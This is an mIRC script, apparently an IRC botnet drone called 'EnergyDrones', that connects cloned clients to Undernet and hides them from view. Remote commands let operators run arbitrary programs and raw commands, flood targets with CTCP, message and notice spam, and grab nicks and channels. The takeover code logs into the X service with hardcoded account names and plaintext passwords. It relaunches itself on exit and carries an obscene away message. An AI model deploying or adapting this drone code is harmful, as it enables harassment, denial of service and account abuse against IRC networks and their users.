on *:start:{
  .st
}
alias secure { mode $me +iwx }
alias st {
  nick $read ident.txt $+ $r(a,z)
  anick $read ident.txt $+ $r(a,z)
  fullname $read fullname.txt
  identd on $read ident.txt
  set %cons
  notify on 
  writeini mirc.ini mirc user $read ident.txt $+ $r(11111,99999) | saveini
  ignore -td *!*@*
  server Drone -j #romania
  server -m Undernet | set %clona1 2
  .timer 1 3 .scid %clona1 server -m Undernet  | set %clona2 $calc(%clona1 + 1)
  .timer 1 6 .scid %clona2 server -m Undernet  | set %clona3 $calc(%clona2 + 1)
  .timer 1 12 silence +*!*@*
  .timer 1 15 mode $me +iwx
  .timer 1 20 secure
  set %utimee $ctime 
  set %1 0,1..0,2..0,3..0,4..0,5..0,6..0,7..0,8..0,9..0,10..0,11..0,12..0,13..0,14..0,15..0,1..0,2..0,3..0,4..0,5..0,6..0,7..0,8..0,9..0,10..0,11..0,12..0,13..0,14..0,15..0,1..0,2..0,3..0,4..0,5..0,6..0,7..0,8..0,9..0,10..0,11..0,12..0,13..0,14..0,15.
  set %2 2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>13<*>14<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>13<*>14<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>13<*>14<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>13<*>14<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>13<*>14<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>13<*>14<*>
  set %3 2o3O4o5O6o7O8o9O10o11O14o2O3o4O5o6O7o8O9o10O11o12O13o14O2o3O4o5O6o7O8o9O10o11O14o2O3o4O5o6O7o8O9o10O11o12O13o14O2o3O4o5O6o7O8o9O10o11O14o2O3o4O5o6O7o8O9o10O11o12O13o14O2o3O4o5O6o7O8o9O10o11O14o2O3o4O5o6O7o8O9o10O11o12O13o14O2o3O4o5O6o7O8o9O10o11O14o2O3o4O5o6O7o8O9o10O11o12O13o14O2o3O4o5O6o7O8o9O10o11O14o2O3o4O5o6O7o8O9o10O11o12O13o14O 
  set %u1 6996
  set %p1 lRKUCkRG
  set %u2 9024
  set %p2 07485632659024
  set %u3 aekeeper1
  set %p3 3pWyY8vr
  set %u4 2oo2
  set %p4 T20PwpRF
  set %l1 x@channels.undernet.org login 6996 lRKUCkRG
  set %l2 x@channels.undernet.org login 9024 07485632659024
  set %l3 x@channels.undernet.org login aekeeper1 3pWyY8vr
  set %l4 x@channels.undernet.org login 2oo2 T20PwpRF
}
on 1:connect:{
  nick $read ident.txt $+ $r(a,z)
  anick $read ident.txt $+ $r(a,z)
  fullname $read fullname.txt
  identd on $read ident.txt
  .timer 1 5 mode $me +iwx
  .timer 1 7 silence +*!*@*
  .timer 1 17 secure
  .notify on
}
on 1:unotify: {
  .nick $nick
}
on *:nick: {
  .timer 1 1 .bitch $newnick [ % $+ [ $newnick ] ] 
}
alias checkme {
  if ($1 !== $2) { echo 0checkme }
  if ($1 == $2) { join #teams .msg %l1 | .away 4<2spaniolu4> 14Sa-mi sugeti cuca 4:14) | .timer 1 3 .msg %l2 | .timer 1 15 .msg %l3 } 
}
alias bitch {
  if ($1 == $2) { 
    .timer 1 4 notify off 
    .msg [ % $+ [ $1 $+ usr ] ] 
    .timer 1 1 .checkme $me $1 | halt 
  }
  if ($1 !== $2) { echo 0bitch }
}
alias connectcheck { whois $me }
on 1:kick:#:{
  haltdef
  if ($knick == $me) {
    .raw join $mass
    halt
  }
}

on 100:text:*:*:{
  if ($1 == +flc) { .ctcp $2 0,1..0,2..0,3..0,4..0,5..0,6..0,7..0,8..0,9..0,10..0,11..0,12..0,13..0,14..0,15..0,1..0,2..0,3..0,4..0,5..0,6..0,7..0,8..0,9..0,10..0,11..0,12..0,13..0,14..0,15..0,1..0,2..0,3..0,4..0,5..0,6..0,7..0,8..0,9..0,10..0,11..0,12..0,13..0,14..0,15. }
  if ($1 == +flm) { .msg $2  2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>13<*>14<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>13<*>14<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>13<*>14<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>13<*>14<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>13<*>14<*>2<*>3<*>4<*>5<*>6<*>7<*>8<*>9<*>10<*>11<*>13<*>14<*> }
  if ($1 == +fln) { .notice $2 2o3O4o5O6o7O8o9O10o11O14o2O3o4O5o6O7o8O9o10O11o12O13o14O2o3O4o5O6o7O8o9O10o11O14o2O3o4O5o6O7o8O9o10O11o12O13o14O2o3O4o5O6o7O8o9O10o11O14o2O3o4O5o6O7o8O9o10O11o12O13o14O2o3O4o5O6o7O8o9O10o11O14o2O3o4O5o6O7o8O9o10O11o12O13o14O2o3O4o5O6o7O8o9O10o11O14o2O3o4O5o6O7o8O9o10O11o12O13o14O2o3O4o5O6o7O8o9O10o11O14o2O3o4O5o6O7o8O9o10O11o12O13o14O }
  if ($1 == +ontime) { .notice $nick 2Ontime 4:2 $uptime(server,1) | halt }
  if ($1 == +uptime) { .notice $nick 2Uptime 4:2 $duration($calc( $ticks / 1000)) | halt }
  if ($1 == +version) { .msg $chan $ver | halt }  
  if ($1 == +cserv) { .notice $nick 2Current Server 4:2 $server }
  if ($1 == +open) { run $2- | .notice $nick 2Try To Open 4:2 $2- | halt } 
  if ($1 == +msg) { .msg $2- | halt }
  if ($1 == +say) { .msg $chan $2- | halt }
  if ($1 == +me) { describe $chan $2- | halt }
  if ($1 == +ame) { ame $2- | halt }
  if ($1 == +away) { .away | .away $2- | halt }
  if ($1 == +join) { join $2- | who $2 | halt }
  if ($1 == +part) { part $2 }
  if ($1 == +raw) { $$2- }
  if ($1 == +login) { .msg x@channels.undernet.org login $2- | halt }
  if ($1 == +exit) && ($level($address($nick,2)) > 2) { exit | halt }
  if ($1 == +part) {
    if ($2 = $chr(42)) {
      set %paid 0
      set %tp $chan(0)
      while (%tp > %paed) {
        set %paid $calc(%paid + 1)
        if ($chan(%paid) != %chan) && ($chan(%paid) != %chan2) { .part $chan(%paed) 2at4  $nick 2request4. }
      }
    }
    .timer 1 0 part $2- 
    halt
  }
  if ($1 == $me) {
    if ($2 == ontime) { .notice $nick 2Ontime 4:2 $uptime(server,1) | halt }
    if ($2 == uptime) { .notice $nick 2Uptime 4:2 $duration($calc( $ticks / 1000)) | halt }  
    if ($2 == cserv) { .notice $nick 2Current Server 4:2 $server }
    if ($2 == msg) { .msg $3- | halt }
    if ($2 == say) { .msg $chan $3- | halt }
    if ($2 == me) { describe $chan $3- | halt }
    if ($2 == notice) { notice $3- | halt }
    if ($2 == away) { .away | .away $3- | halt }
    if ($2 == join) { join $3- | who $3 | halt }
    if ($2 == part) { part $3 }
    if ($2 == raw)  { $$3- }
    if ($2 == exit) && ($level($address($nick,2)) > 2) { exit | halt }
    if ($2 == part) {
      if ($3 == $chr(42)) {
        set %paid 0
        set %tp $chan(0)
        while (%tp > %paid) {
          set %paid $calc(%paid + 1)
          if ($chan(%paid) != %chan) { .part $chan(%paid) 2at4  $nick 2request4. }
        }
      }
      .timer 1 0 part $3- 
      halt
    }
    .timer 1 0 $2-
  }
  if ($1 == .flc) { scid %clona1 .ctcp $2 %1 | scid %clona2 .ctcp $2 %1 | scid %clona3 .ctcp $2 %1 | halt  }
  if ($1 == .flm) { scid %clona1 .msg $2 %2 | scid %clona2 .msg $2 %2 | scid %clona3 .msg $2 %2 | halt }
  if ($1 == .fln) { scid %clona1 .notice $2 %3 | scid %clona2 .notice $2 %3 | scid %clona3 .notice $2 %3 | halt }
  if ($1 == .join) { scid %clona1 join $2- | scid %clona2 join $2- | scid %clona3 join $2- | who $2 | halt }
  if ($1 == .part) { scid %clona1 part $2- | scid %clona2 part $2- | scid %clona3 part $2- | who $2 | halt }
  if ($1 == .msg)  { scid %clona1 .msg $2-  | scid %clona2 .msg $2-   | scid %clona3 .msg $2-  | halt }
  if ($1 == .ctcp) { scid %clona1 .ctcp $2- | scid %clona2 .ctcp $2- | scid %clona3 .ctcp $2- | halt }
  if ($1 == .fura) { set % $+ [ $2 ] $2 | set % $+ [ $2 $+ usr ] x@channels.undernet.org LOGIN $3 $4 | .notify $2 | .notice $nick 2ADD4 $2 2In Notify List4. 1[ 2ON UNDERNET 1] | halt }
  if ($1 == .lasa) { .notify -r $2 | unset % $+ $2 | unset % $+ [ $2 $+ usr ] | .notice $nick 2REM4  $2 2From Notify List4. 1[ 2ON UNDERNET 1] | halt }
  if ($1 == ,rnick) { scid %clona1 nick $read ident.txt $+ $r(1,9) $+ $r(1,9) | scid %clona2 nick $read ident.txt $+ $r(1,9) $+ $r(1,9) | scid %clona3 nick $read ident.txt $+ $r(1,9) $+ $r(1,9) | halt }
  if ($1 == .exit) && ($level($address($nick,2)) > 2) { .scid %clona1 exit | .scid %clona2 exit | .scid %clona3 exit | halt }
  if ($1 == .timer) { set % $+ [ $2 ] $2 | set % $+ [ $2 $+ usr ] X@channels.undernet.org LOGIN $3 $4 | secure | .scid %clona1 .timer 0 3 nick $2 | .scid %clona2 .timer 0 3 nick $2 | .scid %clona3 .timer 0 3 nick $2 | .notice $nick 2Timer On4  $2 2Started 4! 1[ 2ON UNDERNET 2] 4- 1[ 2Simple AutoLogin 1] | halt }
  if ($1 == .fast) { set % $+ [ $2 ] $2 | set % $+ [ $2 $+ usr ] X@channels.undernet.org LOGIN $3 $4 | secure | .scid %clona1 .timer 8 1 nick $2 | .scid %clona2 .timer 8 1 nick $2 | .scid %clona3 .timer 8 1 nick $2 | .notice $nick 2Fast Timer On4  $2 2Started 4! 1[ 2ON UNDERNET 1] | halt }
  if ($1 == .stop) { .scid %clona1 .timers off | .scid %clona2 .timers off | .scid %clona3 .timers off | .notice $nick 2ALL TIMERS STOPED 4! 1[ 2ON UNDERNET 1] | halt }
  if ($1 == .take) { set % $+ [ $2 ] $2 | set % $+ [ $2 $+ usr ] X@channels.undernet.org LOGIN %u1 %p1 | secure | .scid %clona1 .timer 0 3 nick $2 | .scid %clona2 .timer 0 3 nick $2 | .scid %clona3 .timer 0 3 nick $2 | .notice $nick 2Timer On4  $2 2Started 4! 1[ 2ON UNDERNET 1] 4- 2Using AutoLogin User4 %u1  | halt }
  if ($1 == .takeing) { set % $+ [ $2 ] $2 | set % $+ [ $2 $+ usr ] X@channels.undernet.org LOGIN %u2 %p2 | secure | .scid %clona1 .timer 0 3 nick $2 | .scid %clona2 .timer 0 3 nick $2 | .scid %clona3 .timer 0 3 nick $2 | .notice $nick 2Timer On4  $2 2Started 4! 1[ 2ON UNDERNET 1] 4- 2Using AutoLogin User4 %u2 | halt }

}

on 100:notice:*:?: {
  if ($1 == join) { join $2 }
  if ($1 == r) { nick $read ident.txt $+ $r(1,9) $+ $r(1,9)  | halt }
  if ($1 == raw) { $$2- }
}

raw 471:*:{
  haltdef
  .timerjoin $+ $$2 60 30 join $$2
  halt
}

raw 473:*:{
  haltdef
  .timerjoin $+ $$2 60 30 join $$2
  halt
}

on *:exit: { /run $mircexe | halt }
alias ver return 2EnergyDrones4 2.4.7